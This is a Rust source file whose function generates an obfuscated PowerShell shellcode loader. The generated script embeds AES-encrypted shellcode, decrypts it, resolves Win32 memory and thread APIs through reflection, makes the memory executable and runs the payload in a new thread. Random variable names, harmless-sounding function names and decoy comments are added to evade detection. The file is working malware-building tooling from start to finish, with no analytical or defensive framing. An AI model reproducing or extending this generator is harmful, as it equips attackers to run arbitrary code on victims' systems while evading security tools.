use rand::Rng;

pub fn generate_powershell_script(ciphertext: &[u8], key: &[u8; 32], iv: &[u8; 16], rng: &mut impl Rng) -> String {
    let mut script = String::new();

    // Random variable names
    let var_ct = random_var_name(rng);
    let var_key = random_var_name(rng);
    let var_iv = random_var_name(rng);
    let var_sc = random_var_name(rng);
    let var_addr = random_var_name(rng);
    let var_thread = random_var_name(rng);
    let var_aes = random_var_name(rng);
    let var_dec = random_var_name(rng);
    let var_ms = random_var_name(rng);
    let var_cs = random_var_name(rng);
    let var_sc_len = random_var_name(rng);
    let var_old = random_var_name(rng);

    // Reflection-based API resolution variable names
    let var_sys_asm = random_var_name(rng);
    let var_unsafe = random_var_name(rng);
    let var_gmh = random_var_name(rng);
    let var_gpa = random_var_name(rng);
    let var_k32h = random_var_name(rng);
    let var_href = random_var_name(rng);
    let fn_lookup = random_func_name(rng);
    let fn_deltype = random_func_name(rng);
    let var_va_ptr = random_var_name(rng);
    let var_va_del = random_var_name(rng);
    let var_va = random_var_name(rng);
    let var_ct_ptr = random_var_name(rng);
    let var_ct_del = random_var_name(rng);
    let var_ct_fn = random_var_name(rng);
    let var_wf_ptr = random_var_name(rng);
    let var_wf_del = random_var_name(rng);
    let var_wf = random_var_name(rng);
    let var_vp_ptr = random_var_name(rng);
    let var_vp_del = random_var_name(rng);
    let var_vp = random_var_name(rng);

    // Add random comment blocks
    script.push_str(&random_comment(rng));
    script.push('\n');

    // Encode ciphertext as byte array
    script.push_str(&format!("${} = @(\n", var_ct));
    for (i, byte) in ciphertext.iter().enumerate() {
        if i > 0 && i % 20 == 0 {
            script.push_str(",\n");
            script.push_str(&random_comment(rng));
            script.push('\n');
        } else if i > 0 {
            script.push(',');
        }
        if rng.gen_bool(0.5) {
            script.push_str(&format!("0x{:02X}", byte));
        } else {
            script.push_str(&format!("{}", byte));
        }
    }
    script.push_str("\n)\n\n");

    // Embed key
    script.push_str(&random_comment(rng));
    script.push('\n');
    script.push_str(&format!("${} = @(", var_key));
    for (i, b) in key.iter().enumerate() {
        if i > 0 { script.push(','); }
        script.push_str(&format!("0x{:02X}", b));
    }
    script.push_str(")\n");

    // Embed IV
    script.push_str(&random_comment(rng));
    script.push('\n');
    script.push_str(&format!("${} = @(", var_iv));
    for (i, b) in iv.iter().enumerate() {
        if i > 0 { script.push(','); }
        script.push_str(&format!("0x{:02X}", b));
    }
    script.push_str(")\n\n");

    // AES-256-CBC decryption
    script.push_str(&random_comment(rng));
    script.push('\n');
    script.push_str(&format!(
        r#"${aes} = [System.Security.Cryptography.Aes]::Create()
${aes}.Mode = [System.Security.Cryptography.CipherMode]::CBC
${aes}.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
${aes}.Key = [byte[]]${key}
${aes}.IV = [byte[]]${iv}
${dec} = ${aes}.CreateDecryptor()
${ms} = New-Object System.IO.MemoryStream(,[byte[]]${ct})
${cs} = New-Object System.Security.Cryptography.CryptoStream(${ms}, ${dec}, [System.Security.Cryptography.CryptoStreamMode]::Read)
${sc} = New-Object byte[] (${ct}.Length)
${sc_len} = ${cs}.Read(${sc}, 0, ${sc}.Length)
${cs}.Close()
${ms}.Close()
${sc} = ${sc}[0..(${sc_len}-1)]
"#,
        aes = var_aes, key = var_key, iv = var_iv,
        dec = var_dec, ms = var_ms, ct = var_ct,
        cs = var_cs, sc = var_sc, sc_len = var_sc_len
    ));
    script.push('\n');

    // Reflection-based Win32 API resolution (no Add-Type / DllImport)
    script.push_str(&random_comment(rng));
    script.push('\n');

    // Get System assembly and UnsafeNativeMethods
    script.push_str(&format!(
        r#"${sys_asm} = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {{ $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1] -eq 'System.dll' }}
${unsafe} = ${sys_asm}.GetType('Microsoft.Win32.UnsafeNativeMethods')
${gmh} = ${unsafe}.GetMethod('GetModuleHandle')
${gpa} = ${unsafe}.GetMethod('GetProcAddress', [System.Reflection.BindingFlags]'Public,Static', $null, [System.Reflection.CallingConventions]::Any, @([System.Runtime.InteropServices.HandleRef], [string]), $null)
"#,
        sys_asm = var_sys_asm,
        unsafe = var_unsafe,
        gmh = var_gmh,
        gpa = var_gpa
    ));
    script.push('\n');

    script.push_str(&random_comment(rng));
    script.push('\n');

    // Helper function to look up function pointers
    script.push_str(&format!(
        r#"function {fn_lookup}($m, $f) {{
    ${k32h} = ${gmh}.Invoke($null, @($m))
    ${href} = New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ${k32h})
    return ${gpa}.Invoke($null, @(${href}, $f))
}}
"#,
        fn_lookup = fn_lookup,
        k32h = var_k32h,
        gmh = var_gmh,
        href = var_href,
        gpa = var_gpa
    ));
    script.push('\n');

    script.push_str(&random_comment(rng));
    script.push('\n');

    // Helper function to create delegate types via Reflection.Emit
    script.push_str(&format!(
        r#"function {fn_deltype}([Type[]]$p, [Type]$r = [Void]) {{
    $tb = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName('R')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    ).DefineDynamicModule('M', $false).DefineType('D', 'Class,Public,Sealed,AnsiClass,AutoClass', [System.MulticastDelegate])
    $tb.DefineConstructor('RTSpecialName,HideBySig,Public', [System.Reflection.CallingConventions]::Standard, $p).SetImplementationFlags('Runtime,Managed')
    $tb.DefineMethod('Invoke', 'Public,HideBySig,NewSlot,Virtual', $r, $p).SetImplementationFlags('Runtime,Managed')
    return $tb.CreateType()
}}
"#,
        fn_deltype = fn_deltype
    ));
    script.push('\n');

    script.push_str(&random_comment(rng));
    script.push('\n');

    // Resolve VirtualAlloc
    script.push_str(&format!(
        r#"${va_ptr} = {fn_lookup} 'kernel32.dll' 'VirtualAlloc'
${va_del} = {fn_deltype} @([IntPtr],[UInt32],[UInt32],[UInt32]) ([IntPtr])
${va} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${va_ptr}, ${va_del})
"#,
        va_ptr = var_va_ptr, va_del = var_va_del, va = var_va,
        fn_lookup = fn_lookup, fn_deltype = fn_deltype
    ));

    script.push_str(&random_comment(rng));
    script.push('\n');

    // Resolve CreateThread
    script.push_str(&format!(
        r#"${ct_ptr} = {fn_lookup} 'kernel32.dll' 'CreateThread'
${ct_del} = {fn_deltype} @([IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32],[IntPtr]) ([IntPtr])
${ct_fn} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${ct_ptr}, ${ct_del})
"#,
        ct_ptr = var_ct_ptr, ct_del = var_ct_del, ct_fn = var_ct_fn,
        fn_lookup = fn_lookup, fn_deltype = fn_deltype
    ));

    script.push_str(&random_comment(rng));
    script.push('\n');

    // Resolve WaitForSingleObject
    script.push_str(&format!(
        r#"${wf_ptr} = {fn_lookup} 'kernel32.dll' 'WaitForSingleObject'
${wf_del} = {fn_deltype} @([IntPtr],[UInt32]) ([UInt32])
${wf} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${wf_ptr}, ${wf_del})
"#,
        wf_ptr = var_wf_ptr, wf_del = var_wf_del, wf = var_wf,
        fn_lookup = fn_lookup, fn_deltype = fn_deltype
    ));

    script.push_str(&random_comment(rng));
    script.push('\n');

    // Resolve VirtualProtect
    script.push_str(&format!(
        r#"${vp_ptr} = {fn_lookup} 'kernel32.dll' 'VirtualProtect'
${vp_del} = {fn_deltype} @([IntPtr],[UInt32],[UInt32],[IntPtr]) ([Bool])
${vp} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${vp_ptr}, ${vp_del})
"#,
        vp_ptr = var_vp_ptr, vp_del = var_vp_del, vp = var_vp,
        fn_lookup = fn_lookup, fn_deltype = fn_deltype
    ));

    script.push_str(&random_comment(rng));
    script.push('\n');

    // Allocate memory (RW)
    script.push_str(&format!(
        "${addr} = ${va}.Invoke([IntPtr]::Zero, [uint32]${sc}.Length, [uint32]0x3000, [uint32]0x04)\n",
        addr = var_addr,
        va = var_va,
        sc = var_sc
    ));

    script.push_str(&random_comment(rng));
    script.push('\n');

    // Copy decrypted shellcode
    script.push_str(&format!(
        "[System.Runtime.InteropServices.Marshal]::Copy(${sc}, 0, ${addr}, ${sc}.Length)\n",
        sc = var_sc,
        addr = var_addr
    ));

    script.push_str(&random_comment(rng));
    script.push('\n');

    // Change to RX via VirtualProtect
    script.push_str(&format!(
        r#"${old} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(4)
${vp}.Invoke(${addr}, [uint32]${sc}.Length, [uint32]0x20, ${old})
[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${old})
"#,
        old = var_old,
        vp = var_vp,
        addr = var_addr,
        sc = var_sc
    ));

    script.push_str(&random_comment(rng));
    script.push('\n');

    // Create thread
    script.push_str(&format!(
        "${thread} = ${ct_fn}.Invoke([IntPtr]::Zero, [uint32]0, ${addr}, [IntPtr]::Zero, [uint32]0, [IntPtr]::Zero)\n",
        thread = var_thread,
        ct_fn = var_ct_fn,
        addr = var_addr
    ));

    // Wait — use native WaitForSingleObject + PS fallback loop
    script.push_str(&format!(
        "${wf}.Invoke(${thread}, [uint32]0xFFFFFFFF)\n",
        wf = var_wf,
        thread = var_thread
    ));

    // Fallback infinite sleep in case WaitForSingleObject returns
    script.push_str("while($true){Start-Sleep -Seconds 86400}\n");

    script
}

fn random_var_name(rng: &mut impl Rng) -> String {
    let prefixes = ["a", "b", "x", "z", "v", "q", "m", "k", "p", "r"];
    let prefix = prefixes[rng.gen_range(0..prefixes.len())];
    format!("{}{}", prefix, rng.gen_range(1..9999))
}

fn random_func_name(rng: &mut impl Rng) -> String {
    let prefixes = [
        "Get-SysInfo", "Get-Config", "Set-Policy", "Test-Module", "Initialize-Runtime",
        "Resolve-Path", "Update-State", "Read-Buffer", "Write-Log", "Find-Resource",
    ];
    format!("{}{}", prefixes[rng.gen_range(0..prefixes.len())], rng.gen_range(1..999))
}

fn random_comment(rng: &mut impl Rng) -> String {
    let comments = [
        "# Initialize runtime configuration",
        "# Process allocation parameters",
        "# Setup execution context",
        "# Configure memory layout",
        "# Validate system state",
        "# Prepare thread context",
        "# System compatibility check",
        "# Runtime verification step",
    ];
    comments[rng.gen_range(0..comments.len())].to_string()
}
